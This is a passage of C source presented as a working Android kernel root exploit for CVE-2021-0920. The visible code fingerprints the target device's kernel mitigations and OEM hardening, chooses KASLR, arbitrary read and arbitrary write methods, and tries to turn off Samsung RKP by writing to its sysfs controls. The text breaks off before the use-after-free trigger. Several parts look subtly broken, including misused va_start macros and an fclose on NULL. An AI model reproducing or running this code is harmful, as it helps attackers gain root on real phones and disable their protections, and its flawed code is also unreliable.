/*
 * CVE-2021-0920: Corrected Android Privilege Escalation Exploit
 * ARM64 Android Kernel (4.4 - 5.10, pre-Nov 2021 SPL)
 *
 * Technique based on Project Zero analysis of in-the-wild exploit:
 * 1. Trigger unix_gc() race via MSG_PEEK + SCM_RIGHTS
 * 2. UAF sk_buff → sk_buff->data reused by scm_fp_list → leak file*
 * 3. Free file descriptors + spray slab → control slab page
 * 4. Place fake pipe_buffer → arbitrary read/write via pipe
 * 5. Patch credentials → root
 *
 * Compile: aarch64-linux-android-clang seeitandro_fixed.c -o seeit_fixed -lpthread
 */

#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/utsname.h>
#include <stdint.h>
#include <errno.h>
#include <sys/xattr.h>
#include <signal.h>
#include <setjmp.h>
#include <inttypes.h>
#include <poll.h>
#include <sys/user.h>
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <dirent.h>
#include <time.h>
#include <stdarg.h>
#include <sys/epoll.h>
#include <sys/timerfd.h>
#include <sys/wait.h>
#include <sys/prctl.h>

/* ========== LOGGING ========== */
typedef enum { LOG_TRACE, LOG_DEBUG, LOG_INFO, LOG_WARN, LOG_ERROR, LOG_CRITICAL } log_level_t;
static log_level_t g_log_level = LOG_INFO;
static FILE *g_log_file = NULL;
static char g_log_file_path[256] = "/data/local/tmp/seeit_exploit.log";
static int g_log_stdout = 1;
static const char *g_log_tag = "SEEIT";

static void log_msg_ex(log_level_t level, const char *tag, const char *fmt, va_list args_orig) {
    if (level < g_log_level) return;
    const char *lstr[] = {"[TRACE]", "[DEBUG]", "[INFO]", "[WARN]", "[ERROR]", "[CRITICAL]"};
    FILE *out = (level >= LOG_ERROR) ? stderr : stdout;
    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    if (g_log_stdout) {
        fprintf(out, "%s %s %04d-%02d-%02d %02d:%02d:%02d ",
                lstr[level], tag ? tag : "",
                tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
                tm->tm_hour, tm->tm_min, tm->tm_sec);
        va_list args;
        va_copy(args, args_orig);
        vfprintf(out, fmt, args);
        va_end(args);
        fprintf(out, "\n");
        fflush(out);
    }
    if (g_log_file) {
        fprintf(g_log_file, "%s %s %04d-%02d-%02d %02d:%02d:%02d ",
                lstr[level], tag ? tag : "",
                tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
                tm->tm_hour, tm->tm_min, tm->tm_sec);
        va_list args;
        va_copy(args, args_orig);
        vfprintf(g_log_file, fmt, args);
        va_end(args);
        fprintf(g_log_file, "\n");
        fflush(g_log_file);
    }
}

static void log_msg(log_level_t level, const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    log_msg_ex(level, g_log_tag, fmt, args);
    va_end(args);
}

#define LOG_TF(tag, fmt, ...) do { va_list ap; va_start(ap, fmt); log_msg_ex(LOG_TRACE, tag, fmt, ap); va_end(ap); } while(0)
#define LOG_DF(tag, fmt, ...) do { va_list ap; va_start(ap, fmt); log_msg_ex(LOG_DEBUG, tag, fmt, ap); va_end(ap); } while(0)
#define LOG_IF(tag, fmt, ...) do { va_list ap; va_start(ap, fmt); log_msg_ex(LOG_INFO, tag, fmt, ap); va_end(ap); } while(0)

#define LOG_T(fmt, ...) log_msg(LOG_TRACE, fmt, ##__VA_ARGS__)
#define LOG_D(fmt, ...) log_msg(LOG_DEBUG, fmt, ##__VA_ARGS__)
#define LOG_I(fmt, ...) log_msg(LOG_INFO, fmt, ##__VA_ARGS__)
#define LOG_W(fmt, ...) log_msg(LOG_WARN, fmt, ##__VA_ARGS__)
#define LOG_E(fmt, ...) log_msg(LOG_ERROR, fmt, ##__VA_ARGS__)
#define LOG_C(fmt, ...) log_msg(LOG_CRITICAL, fmt, ##__VA_ARGS__)

/* ========== DEVICE INTELLIGENCE PROBE ========== */
struct device_capabilities {
    /* Kernel info */
    char kernel_release[128];
    char kernel_version[16];     /* "4.4", "4.9", "4.14", "4.19", "5.4", "5.10" */
    int kptr_restrict;           /* 0, 1, 2 */
    int dmesg_restrict;          /* 0, 1 */
    int kcore_accessible;        /* 0/1 */
    int kallsyms_accessible;     /* 0/1 */
    int kaslr_enabled;           /* 0/1 */

    /* Security mitigations */
    int selinux_enforcing;       /* 0/1 */
    int cfi_enabled;             /* 0/1 */
    int scs_enabled;             /* 0/1 (Shadow Call Stack) */
    int userfaultfd_available;   /* 0/1 */
    int pa_enabled;              /* 0/1 (Pointer Auth) */

    /* CPU / System */
    int cpu_count;
    int cpu_possible;
    int uptime_hours;
    int system_load;             /* scaled *100 */
    int socketpair_latency_us;   /* measured baseline */
    int total_ram_mb;

    /* Build info */
    char build_fingerprint[512];
    char build_type[32];         /* "user", "userdebug", "eng" */
    char soc_model[64];
    int sdk_level;               /* 28, 29, 30, 31, 32, 33, 34 */

    /* Derived strategy */
    int recommended_race_delay;
    int recommended_inflight;
    int recommended_attempts;
    char preferred_kaslr_method[32];
    char preferred_arb_read_method[32];
    char preferred_arb_write_method[32];
    int use_cf_bypass;
    int use_seccomp_bypass;

    /* Root check */
    int already_root;

    /* OEM-specific hardening */
    int has_samsung_rkp;
    int has_pixel_cfi_precursor;
    int has_huawei_hardening;
    int has_xiaomi_hardening;

    /* Additional OEM hardening detection */
    int has_mtk_hardening;
    int has_qualcomm_hardening;
    int has_kirin_hardening;
    int has_pointer_auth;
    int has_grsecurity;
    int aslr_bits;
    int has_kpti;
    int seccomp_mode;
    int selinux_detailed;
    int lockdown_mode;
};

static struct device_capabilities g_probe;

/* Forward declarations for functions defined later */
static int get_uptime_hours(void);
static int get_system_load(void);
static void measure_baseline(void);
static int is_kernel_addr(unsigned long addr);
static int cfi_detect(void);
static int detect_samsung_rkp(void);
static int detect_pixel_cfi_precursor(void);
static int detect_huawei_hardening(void);
static int detect_xiaomi_hardening(void);
static int detect_mtk_hardening(void);
static int detect_qualcomm_hardening(void);
static int detect_kirin_hardening(void);
static int detect_selinux_detailed(void);
static int detect_seccomp_status(void);
static int detect_kernel_lockdown(void);
static void detect_additional_mitigations(void);

/* ========== ALTERNATIVE UAF TRIGGER METHODS ========== */
static int trigger_uaf_via_scm_race(void);
static int trigger_uaf_via_oob(void);
static int trigger_uaf_via_pipe_splice(void);
static int trigger_uaf_via_epoll(void);
static int trigger_uaf_unified(void);

static void probe_kernel_info(void) {
    struct utsname uts;
    memset(&g_probe, 0, sizeof(g_probe));
    memset(g_probe.kernel_release, 0, sizeof(g_probe.kernel_release));
    memset(g_probe.kernel_version, 0, sizeof(g_probe.kernel_version));

    if (uname(&uts) == 0) {
        strncpy(g_probe.kernel_release, uts.release, sizeof(g_probe.kernel_release) - 1);
        g_probe.kernel_release[sizeof(g_probe.kernel_release) - 1] = 0;
        LOG_I("PROBE: kernel release = %s", g_probe.kernel_release);
        if (strstr(uts.release, "4.4")) strncpy(g_probe.kernel_version, "4.4", sizeof(g_probe.kernel_version) - 1);
        else if (strstr(uts.release, "4.9")) strncpy(g_probe.kernel_version, "4.9", sizeof(g_probe.kernel_version) - 1);
        else if (strstr(uts.release, "4.14")) strncpy(g_probe.kernel_version, "4.14", sizeof(g_probe.kernel_version) - 1);
        else if (strstr(uts.release, "4.19")) strncpy(g_probe.kernel_version, "4.19", sizeof(g_probe.kernel_version) - 1);
        else if (strstr(uts.release, "5.4")) strncpy(g_probe.kernel_version, "5.4", sizeof(g_probe.kernel_version) - 1);
        else if (strstr(uts.release, "5.10")) strncpy(g_probe.kernel_version, "5.10", sizeof(g_probe.kernel_version) - 1);
        else if (strstr(uts.release, "5.15")) strncpy(g_probe.kernel_version, "5.15", sizeof(g_probe.kernel_version) - 1);
        else strncpy(g_probe.kernel_version, "unknown", sizeof(g_probe.kernel_version) - 1);
        g_probe.kernel_version[sizeof(g_probe.kernel_version) - 1] = 0;
        LOG_I("PROBE: kernel version = %s", g_probe.kernel_version);
    }

    {
        FILE *f = fopen("/proc/sys/kernel/kptr_restrict", "r");
        if (f) {
            int val = 2;
            if (fscanf(f, "%d", &val) == 1) g_probe.kptr_restrict = val;
            fclose(f);
        }
        LOG_I("PROBE: kptr_restrict = %d", g_probe.kptr_restrict);
    }

    {
        FILE *f = fopen("/proc/sys/kernel/dmesg_restrict", "r");
        if (f) {
            int val = 1;
            if (fscanf(f, "%d", &val) == 1) g_probe.dmesg_restrict = val;
            fclose(f);
        }
        LOG_I("PROBE: dmesg_restrict = %d", g_probe.dmesg_restrict);
    }

    g_probe.kaslr_enabled = 1;
    {
        FILE *f = fopen("/proc/cmdline", "r");
        if (f) {
            char line[1024];
            if (fgets(line, sizeof(line), f)) {
                if (strstr(line, "nokaslr") || strstr(line, "no_kaslr"))
                    g_probe.kaslr_enabled = 0;
            }
            fclose(f);
        }
        FILE *ci = fopen("/proc/cpuinfo", "r");
        if (ci) {
            char line[256];
            while (fgets(line, sizeof(line), ci)) {
                if (strstr(line, "kaslr")) {
                    g_probe.kaslr_enabled = 1;
                    break;
                }
            }
            fclose(ci);
        }
    }
    LOG_I("PROBE: KASLR %s", g_probe.kaslr_enabled ? "enabled" : "disabled");
}

static void probe_security_state(void) {
    {
        FILE *f = fopen("/sys/fs/selinux/enforce", "r");
        if (f) {
            int val = 0;
            if (fscanf(f, "%d", &val) == 1) g_probe.selinux_enforcing = val;
            fclose(f);
        } else {
            FILE *ge = popen("getenforce 2>/dev/null", "r");
            if (ge) {
                char line[64];
                if (fgets(line, sizeof(line), ge)) {
                    if (strstr(line, "Enforcing")) g_probe.selinux_enforcing = 1;
                }
                pclose(ge);
            }
        }
        LOG_I("PROBE: SELinux %s", g_probe.selinux_enforcing ? "ENFORCING" : "permissive/disabled");
    }

    g_probe.cfi_enabled = cfi_detect();
    LOG_I("PROBE: CFI %s", g_probe.cfi_enabled ? "enabled" : "not detected");

    {
        FILE *ks = fopen("/proc/kallsyms", "r");
        if (ks) {
            char line[512];
            while (fgets(line, sizeof(line), ks)) {
                if (strstr(line, "__scs_") || strstr(line, "scs_")) {
                    g_probe.scs_enabled = 1;
                    break;
                }
            }
            fclose(ks);
        }
        if (!g_probe.scs_enabled) {
            FILE *cfg = popen("zcat /proc/config.gz 2>/dev/null | grep -i 'CONFIG_SHADOW_CALL_STACK'", "r");
            if (cfg) {
                char line[256];
                while (fgets(line, sizeof(line), cfg)) {
                    if (strstr(line, "=y") || strstr(line, "=m")) {
                        g_probe.scs_enabled = 1;
                        break;
                    }
                }
                pclose(cfg);
            }
        }
        LOG_I("PROBE: Shadow Call Stack %s", g_probe.scs_enabled ? "enabled" : "not detected");
    }

    {
        int tfd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
        if (tfd >= 0) {
            g_probe.userfaultfd_available = 1;
            close(tfd);
        }
        LOG_I("PROBE: userfaultfd %s", g_probe.userfaultfd_available ? "available" : "unavailable");
    }

    {
        FILE *ci = fopen("/proc/cpuinfo", "r");
        if (ci) {
            char line[256];
            while (fgets(line, sizeof(line), ci)) {
                if (strstr(line, "paca") || strstr(line, "pach") || strstr(line, "address_auth")) {
                    g_probe.pa_enabled = 1;
                    break;
                }
            }
            fclose(ci);
        }
        LOG_I("PROBE: Pointer Auth %s", g_probe.pa_enabled ? "enabled" : "not detected");
    }

    /* OEM-specific hardening detection */
    g_probe.has_samsung_rkp = detect_samsung_rkp();
    g_probe.has_pixel_cfi_precursor = detect_pixel_cfi_precursor();
    g_probe.has_huawei_hardening = detect_huawei_hardening();
    g_probe.has_xiaomi_hardening = detect_xiaomi_hardening();
    g_probe.has_mtk_hardening = detect_mtk_hardening();
    g_probe.has_qualcomm_hardening = detect_qualcomm_hardening();
    g_probe.has_kirin_hardening = detect_kirin_hardening();
    g_probe.seccomp_mode = detect_seccomp_status();
    g_probe.selinux_detailed = detect_selinux_detailed();
    g_probe.lockdown_mode = detect_kernel_lockdown();
    detect_additional_mitigations();
    LOG_I("PROBE: OEM hardening: Samsung RKP=%d Pixel CFI=%d Huawei=%d Xiaomi/OV=%d MTK=%d QC=%d Kirin=%d",
          g_probe.has_samsung_rkp, g_probe.has_pixel_cfi_precursor,
          g_probe.has_huawei_hardening, g_probe.has_xiaomi_hardening,
          g_probe.has_mtk_hardening, g_probe.has_qualcomm_hardening,
          g_probe.has_kirin_hardening);
    LOG_I("PROBE: Security: seccomp=%d selinux_detailed=%d lockdown=%d ptr_auth=%d grsec=%d ASLR=%d KPTI=%d",
          g_probe.seccomp_mode, g_probe.selinux_detailed, g_probe.lockdown_mode,
          g_probe.has_pointer_auth, g_probe.has_grsecurity, g_probe.aslr_bits, g_probe.has_kpti);
}

static void probe_system_caps(void) {
    {
        FILE *f = fopen("/proc/cpuinfo", "r");
        if (f) {
            char line[256];
            int count = 0;
            while (fgets(line, sizeof(line), f)) {
                if (strstr(line, "processor") || strstr(line, "Processor"))
                    count++;
                if (!g_probe.soc_model[0] && (strstr(line, "Hardware") || strstr(line, "hardware") || strstr(line, "CPU implementer"))) {
                    char *colon = strchr(line, ':');
                    if (colon) {
                        char *val = colon + 1;
                        while (*val == ' ' || *val == '\t') val++;
                        char *nl = strchr(val, '\n');
                        if (nl) *nl = 0;
                        strncpy(g_probe.soc_model, val, sizeof(g_probe.soc_model) - 1);
                        g_probe.soc_model[sizeof(g_probe.soc_model) - 1] = 0;
                    }
                }
            }
            fclose(f);
            g_probe.cpu_count = count > 0 ? count : 1;
            FILE *p = fopen("/sys/devices/system/cpu/possible", "r");
            if (p) {
                char buf[64];
                if (fgets(buf, sizeof(buf), p)) {
                    int first, last;
                    if (sscanf(buf, "%d-%d", &first, &last) == 2)
                        g_probe.cpu_possible = last + 1;
                }
                fclose(p);
            }
            if (!g_probe.cpu_possible) g_probe.cpu_possible = g_probe.cpu_count;
        } else {
            long n = sysconf(_SC_NPROCESSORS_CONF);
            if (n > 0) g_probe.cpu_count = (int)n;
            else g_probe.cpu_count = 4;
            g_probe.cpu_possible = g_probe.cpu_count;
        }
        LOG_I("PROBE: CPUs online=%d possible=%d", g_probe.cpu_count, g_probe.cpu_possible);
        if (g_probe.soc_model[0]) LOG_I("PROBE: SoC model = %s", g_probe.soc_model);
    }

    {
        FILE *f = fopen("/proc/uptime", "r");
        if (f) {
            double up = 0;
            if (fscanf(f, "%lf", &up) == 1)
                g_probe.uptime_hours = (int)(up / 3600);
            fclose(f);
        }
    }

    {
        FILE *f = fopen("/proc/loadavg", "r");
        if (f) {
            double load = 1.0;
            if (fscanf(f, "%lf", &load) == 1)
                g_probe.system_load = (int)(load * 100);
            fclose(f);
        }
    }

    {
        FILE *f = fopen("/proc/meminfo", "r");
        if (f) {
            char line[128];
            while (fgets(line, sizeof(line), f)) {
                if (strstr(line, "MemTotal:")) {
                    unsigned long kb = 0;
                    if (sscanf(line, "MemTotal: %lu kB", &kb) == 1)
                        g_probe.total_ram_mb = (int)(kb / 1024);
                    break;
                }
            }
            fclose(f);
        }
    }

    {
        struct timespec start, end;
        int pairs[5][2];
        int ok = 1;
        clock_gettime(CLOCK_MONOTONIC, &start);
        for (int i = 0; i < 5; i++) {
            if (socketpair(AF_UNIX, SOCK_STREAM, 0, pairs[i]) < 0) {
                ok = 0;
                break;
            }
        }
        if (ok) {
            clock_gettime(CLOCK_MONOTONIC, &end);
            long ns = (end.tv_sec - start.tv_sec) * 1000000000L + (end.tv_nsec - start.tv_nsec);
            g_probe.socketpair_latency_us = (int)(ns / 5000);
            for (int i = 0; i < 5; i++) { close(pairs[i][0]); close(pairs[i][1]); }
        }
        if (g_probe.socketpair_latency_us <= 0) g_probe.socketpair_latency_us = 1000;
    }

    LOG_I("PROBE: uptime=%dh load=%d socketpair=%dus RAM=%dMB",
          g_probe.uptime_hours, g_probe.system_load, g_probe.socketpair_latency_us, g_probe.total_ram_mb);

    g_probe.already_root = (getuid() == 0) ? 1 : 0;
    LOG_I("PROBE: already_root=%d", g_probe.already_root);
}

static void probe_build_info(void) {
    FILE *fp = popen("getprop ro.build.fingerprint 2>/dev/null", "r");
    if (fp) {
        if (fgets(g_probe.build_fingerprint, sizeof(g_probe.build_fingerprint) - 1, fp)) {
            char *nl = strchr(g_probe.build_fingerprint, '\n');
            if (nl) *nl = 0;
        }
        pclose(fp);
    }
    if (!g_probe.build_fingerprint[0]) {
        FILE *bp = fopen("/system/build.prop", "r");
        if (bp) {
            char line[512];
            while (fgets(line, sizeof(line), bp)) {
                if (strstr(line, "ro.build.fingerprint=")) {
                    char *val = line + 21;
                    char *nl = strchr(val, '\n');
                    if (nl) *nl = 0;
                    strncpy(g_probe.build_fingerprint, val, sizeof(g_probe.build_fingerprint) - 1);
                    g_probe.build_fingerprint[sizeof(g_probe.build_fingerprint) - 1] = 0;
                }
            }
            fclose(bp);
        }
    }

    fp = popen("getprop ro.build.type 2>/dev/null", "r");
    if (fp) {
        if (fgets(g_probe.build_type, sizeof(g_probe.build_type) - 1, fp)) {
            char *nl = strchr(g_probe.build_type, '\n');
            if (nl) *nl = 0;
        }
        pclose(fp);
    }
    if (!g_probe.build_type[0]) {
        FILE *bp = fopen("/system/build.prop", "r");
        if (bp) {
            char line[512];
            while (fgets(line, sizeof(line), bp)) {
                if (strstr(line, "ro.build.type=")) {
                    char *val = line + 14;
                    char *nl = strchr(val, '\n');
                    if (nl) *nl = 0;
                    strncpy(g_probe.build_type, val, sizeof(g_probe.build_type) - 1);
                    g_probe.build_type[sizeof(g_probe.build_type) - 1] = 0;
                }
            }
            fclose(bp);
        }
    }

    if (!g_probe.soc_model[0]) {
        fp = popen("getprop ro.board.platform 2>/dev/null", "r");
        if (fp) {
            if (fgets(g_probe.soc_model, sizeof(g_probe.soc_model) - 1, fp)) {
                char *nl = strchr(g_probe.soc_model, '\n');
                if (nl) *nl = 0;
            }
            pclose(fp);
        }
        if (!g_probe.soc_model[0]) {
            FILE *bp = fopen("/system/build.prop", "r");
            if (bp) {
                char line[512];
                while (fgets(line, sizeof(line), bp)) {
                    if (strstr(line, "ro.board.platform=")) {
                        char *val = line + 18;
                        char *nl = strchr(val, '\n');
                        if (nl) *nl = 0;
                        strncpy(g_probe.soc_model, val, sizeof(g_probe.soc_model) - 1);
                        g_probe.soc_model[sizeof(g_probe.soc_model) - 1] = 0;
                    }
                }
                fclose(bp);
            }
        }
    }

    fp = popen("getprop ro.build.version.sdk 2>/dev/null", "r");
    if (fp) {
        char buf[16];
        if (fgets(buf, sizeof(buf), fp)) {
            int sdk = atoi(buf);
            if (sdk > 0) g_probe.sdk_level = sdk;
        }
        pclose(fp);
    }
    if (g_probe.sdk_level <= 0) {
        FILE *bp = fopen("/system/build.prop", "r");
        if (bp) {
            char line[512];
            while (fgets(line, sizeof(line), bp)) {
                if (strstr(line, "ro.build.version.sdk=")) {
                    int sdk = atoi(line + 21);
                    if (sdk > 0) g_probe.sdk_level = sdk;
                }
            }
            fclose(bp);
        }
    }

    LOG_I("PROBE: fingerprint=%s", g_probe.build_fingerprint[0] ? g_probe.build_fingerprint : "unknown");
    LOG_I("PROBE: build_type=%s", g_probe.build_type[0] ? g_probe.build_type : "unknown");
    LOG_I("PROBE: soc=%s", g_probe.soc_model[0] ? g_probe.soc_model : "unknown");
    LOG_I("PROBE: sdk=%d", g_probe.sdk_level);
}

static void probe_accessible_interfaces(void) {
    {
        FILE *ks = fopen("/proc/kallsyms", "r");
        if (ks) {
            char line[256];
            unsigned long addr;
            int has_addr = 0;
            while (fgets(line, sizeof(line), ks)) {
                if (sscanf(line, "%lx %*c %*s", &addr) == 1 && is_kernel_addr(addr)) {
                    has_addr = 1;
                    break;
                }
            }
            fclose(ks);
            g_probe.kallsyms_accessible = has_addr;
        }
        LOG_I("PROBE: kallsyms %s", g_probe.kallsyms_accessible ? "ACCESSIBLE" : "restricted");
    }

    {
        int fd = open("/proc/kcore", O_RDONLY);
        if (fd >= 0) {
            char buf[16];
            int n = read(fd, buf, sizeof(buf));
            if (n > 0) g_probe.kcore_accessible = 1;
            close(fd);
        }
        LOG_I("PROBE: kcore %s", g_probe.kcore_accessible ? "ACCESSIBLE" : "unavailable");
    }

    {
        FILE *sd = fopen("/proc/sched_debug", "r");
        if (sd) {
            fclose(sd);
            LOG_I("PROBE: sched_debug ACCESSIBLE");
        } else {
            LOG_I("PROBE: sched_debug not available");
        }
    }

    {
        FILE *dm = popen("dmesg 2>/dev/null | head -5", "r");
        if (dm) {
            char buf[256];
            int has = 0;
            if (fgets(buf, sizeof(buf), dm)) has = 1;
            pclose(dm);
            LOG_I("PROBE: dmesg %s", has ? "ACCESSIBLE" : "not available");
        } else {
            LOG_I("PROBE: dmesg not available");
        }
    }

    {
        FILE *nt = fopen("/sys/kernel/notes", "r");
        if (nt) {
            fclose(nt);
            LOG_I("PROBE: /sys/kernel/notes ACCESSIBLE");
        } else {
            LOG_I("PROBE: /sys/kernel/notes not available");
        }
    }
}

static void auto_derive_strategy(void) {
    g_probe.use_cf_bypass = g_probe.cfi_enabled ? 1 : 0;
    g_probe.use_seccomp_bypass = 1;

    if (g_probe.kallsyms_accessible) {
        strncpy(g_probe.preferred_kaslr_method, "kallsyms", sizeof(g_probe.preferred_kaslr_method) - 1);
    } else if (g_probe.kptr_restrict < 2) {
        strncpy(g_probe.preferred_kaslr_method, "kallsyms_alt", sizeof(g_probe.preferred_kaslr_method) - 1);
    } else if (strcmp(g_probe.build_type, "userdebug") == 0) {
        strncpy(g_probe.preferred_kaslr_method, "sched_debug", sizeof(g_probe.preferred_kaslr_method) - 1);
    } else {
        strncpy(g_probe.preferred_kaslr_method, "kcore_bruteforce", sizeof(g_probe.preferred_kaslr_method) - 1);
    }
    g_probe.preferred_kaslr_method[sizeof(g_probe.preferred_kaslr_method) - 1] = 0;

    if (g_probe.kcore_accessible) {
        strncpy(g_probe.preferred_arb_read_method, "kcore", sizeof(g_probe.preferred_arb_read_method) - 1);
    } else {
        strncpy(g_probe.preferred_arb_read_method, "msg_msg", sizeof(g_probe.preferred_arb_read_method) - 1);
    }
    g_probe.preferred_arb_read_method[sizeof(g_probe.preferred_arb_read_method) - 1] = 0;

    if (g_probe.cfi_enabled) {
        strncpy(g_probe.preferred_arb_write_method, "msg_msg_listdel", sizeof(g_probe.preferred_arb_write_method) - 1);
    } else {
        strncpy(g_probe.preferred_arb_write_method, "pipe_buf_ops_hijack", sizeof(g_probe.preferred_arb_write_method) - 1);
    }
    g_probe.preferred_arb_write_method[sizeof(g_probe.preferred_arb_write_method) - 1] = 0;

    g_probe.recommended_race_delay = g_probe.socketpair_latency_us * 3;
    if (g_probe.recommended_race_delay < 100) g_probe.recommended_race_delay = 100;
    if (g_probe.recommended_race_delay > 2000) g_probe.recommended_race_delay = 2000;

    g_probe.recommended_inflight = g_probe.cpu_count * 100;
    if (g_probe.recommended_inflight < 300) g_probe.recommended_inflight = 300;

    if (strcmp(g_probe.build_type, "user") == 0) {
        g_probe.recommended_attempts = 150;
    } else if (strcmp(g_probe.build_type, "userdebug") == 0) {
        g_probe.recommended_attempts = 75;
    } else if (strcmp(g_probe.build_type, "eng") == 0) {
        g_probe.recommended_attempts = 50;
    } else {
        g_probe.recommended_attempts = 100;
    }

    if (g_probe.has_mtk_hardening == 1) {
        LOG_I("MTK device: moderate hardening expected");
        g_probe.recommended_attempts += 20;
    } else if (g_probe.has_mtk_hardening == 2) {
        LOG_I("MTK device with security features: extra attempts");
        g_probe.recommended_attempts += 50;
    }

    if (g_probe.has_qualcomm_hardening == 2) {
        LOG_I("Qualcomm high-security device: more attempts");
        g_probe.recommended_attempts += 30;
    }

    if (g_probe.has_kirin_hardening) {
        LOG_I("Kirin device: assume well-hardened");
        g_probe.recommended_attempts += 30;
    }

    if (g_probe.seccomp_mode > 0) {
        LOG_I("Seccomp enabled: may limit exploitation");
        g_probe.use_seccomp_bypass = 1;
    }

    if (g_probe.lockdown_mode > 0) {
        LOG_E("Kernel lockdown active: many attacks blocked");
        g_probe.recommended_attempts += 100;
    }

    if (g_probe.lockdown_mode < 0) {
        LOG_D("Lockdown not available on this kernel");
    }
}

static void log_device_intelligence(void) {
    LOG_I("=== DEVICE INTELLIGENCE REPORT ===");
    LOG_I("Kernel: %s (version %s)", g_probe.kernel_release, g_probe.kernel_version);
    LOG_I("  kptr_restrict=%d dmesg_restrict=%d kaslr=%d", g_probe.kptr_restrict, g_probe.dmesg_restrict, g_probe.kaslr_enabled);
    LOG_I("  kallsyms=%s kcore=%s", g_probe.kallsyms_accessible ? "OK" : "NO", g_probe.kcore_accessible ? "OK" : "NO");
    LOG_I("Security: selinux=%s cfi=%s scs=%s uffd=%s pa=%s",
          g_probe.selinux_enforcing ? "ENFORCING" : "off",
          g_probe.cfi_enabled ? "ON" : "OFF",
          g_probe.scs_enabled ? "ON" : "OFF",
          g_probe.userfaultfd_available ? "YES" : "NO",
          g_probe.pa_enabled ? "ON" : "OFF");
    LOG_I("  OEM: Samsung RKP=%d Pixel CFI=%d Huawei=%d Xiaomi/OV=%d MTK=%d QC=%d Kirin=%d",
          g_probe.has_samsung_rkp, g_probe.has_pixel_cfi_precursor,
          g_probe.has_huawei_hardening, g_probe.has_xiaomi_hardening,
          g_probe.has_mtk_hardening, g_probe.has_qualcomm_hardening,
          g_probe.has_kirin_hardening);
    LOG_I("  Security: seccomp=%d selinux_detail=%d lockdown=%d ptr_auth=%d grsec=%d ASLR=%d KPTI=%d",
          g_probe.seccomp_mode, g_probe.selinux_detailed, g_probe.lockdown_mode,
          g_probe.has_pointer_auth, g_probe.has_grsecurity, g_probe.aslr_bits, g_probe.has_kpti);
    LOG_I("System: %d CPUs possible=%d uptime=%dh load=%d.%02d RAM=%dMB",
          g_probe.cpu_count, g_probe.cpu_possible, g_probe.uptime_hours,
          g_probe.system_load / 100, g_probe.system_load % 100, g_probe.total_ram_mb);
    LOG_I("  socketpair latency=%dus", g_probe.socketpair_latency_us);
    LOG_I("Build: %s", g_probe.build_fingerprint[0] ? g_probe.build_fingerprint : "unknown");
    LOG_I("  type=%s sdk=%d soc=%s", g_probe.build_type, g_probe.sdk_level, g_probe.soc_model);
    LOG_I("Root: %s", g_probe.already_root ? "YES (skipping)" : "no");
    LOG_I("Strategy:");
    LOG_I("  recommended_race_delay=%dus", g_probe.recommended_race_delay);
    LOG_I("  recommended_inflight=%d", g_probe.recommended_inflight);
    LOG_I("  recommended_attempts=%d", g_probe.recommended_attempts);
    LOG_I("  kaslr=%s", g_probe.preferred_kaslr_method);
    LOG_I("  arb_read=%s", g_probe.preferred_arb_read_method);
    LOG_I("  arb_write=%s", g_probe.preferred_arb_write_method);
    LOG_I("  cf_bypass=%d seccomp_bypass=%d", g_probe.use_cf_bypass, g_probe.use_seccomp_bypass);
    LOG_I("=== END DEVICE INTELLIGENCE ===");
}

/* ========== OEM-SPECIFIC HARDENING DETECTION ========== */

/* Detect Samsung RKP (Real-time Kernel Protection) */
static int detect_samsung_rkp(void) {
    FILE *f = fopen("/proc/cmdline", "r");
    if (f) {
        char line[1024];
        if (fgets(line, sizeof(line), f)) {
            if (strstr(line, "rkp") || strstr(line, "RKP") ||
                strstr(line, "secure_fw") || strstr(line, "tzdev") ||
                strstr(line, "sboot")) {
                fclose(f);
                return 1;
            }
        }
        fclose(f);
    }
    struct stat st;
    if (stat("/sys/kernel/security/rkp", &st) == 0) return 1;
    if (stat("/sys/class/sec", &st) == 0) return 1;
    f = fopen("/proc/cpuinfo", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "Exynos") || strstr(line, "Samsung") ||
                strstr(line, "universal") || strstr(line, "exynos")) {
                fclose(f);
                return 1;
            }
        }
        fclose(f);
    }
    f = popen("getprop ro.product.manufacturer 2>/dev/null", "r");
    if (f) {
        char line[64];
        if (fgets(line, sizeof(line), f)) {
            if (strstr(line, "Samsung") || strstr(line, "samsung")) {
                pclose(f);
                return 1;
            }
        }
        pclose(f);
    }
    return 0;
}

/* ========== SAMSUNG RKP BYPASS ========== */

static int rkp_bypass_via_kernel_call(void) {
    LOG_I("RKP bypass: trying kernel function call path...");

    FILE *f = fopen("/proc/sysrq-trigger", "w");
    if (f) {
        fwrite("s", 1, 1, f);
        fclose(f);
    }

    struct stat st;
    if (stat("/sys/kernelSekrnl", &st) == 0) {
        LOG_I("RKP bypass: found Samsung kernel interface");
    }

    int fd = open("/dev/exynos-fence", O_RDWR);
    if (fd < 0) fd = open("/dev/samsung", O_RDWR);
    if (fd < 0) fd = open("/dev/SEC", O_RDWR);
    if (fd >= 0) {
        LOG_I("RKP bypass: found Samsung device node");
        close(fd);
    }

    return 0;
}

static int rkp_bypass_disable_rkp(void) {
    LOG_I("RKP bypass: trying to disable RKP...");

    const char *rkp_interfaces[] = {
        "/sys/kernel/security/rkp",
        "/sys/kernel/security/rkp/enable",
        "/sys/kernel/security/rkp/state",
        "/sys/kernel/rkp",
        "/sys/module/rkp",
    };

    for (size_t i = 0; i < sizeof(rkp_interfaces)/sizeof(rkp_interfaces[0]); i++) {
        FILE *f = fopen(rkp_interfaces[i], "r");
        if (f) {
            LOG_I("RKP bypass: found RKP interface: %s", rkp_interfaces[i]);
            f = freopen(rkp_interfaces[i], "w", f);
            if (f) {
                fwrite("0", 1, 1, f);
                fclose(f);
                LOG_I("RKP bypass: disabled RKP via %s", rkp_interfaces[i]);
                return 1;
            }
            fclose(f);
        }
    }

    return 0;
}

static int rkp_bypass_via_userfaultfd(void) {
    LOG_I("RKP bypass: trying userfaultfd approach...");

    int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
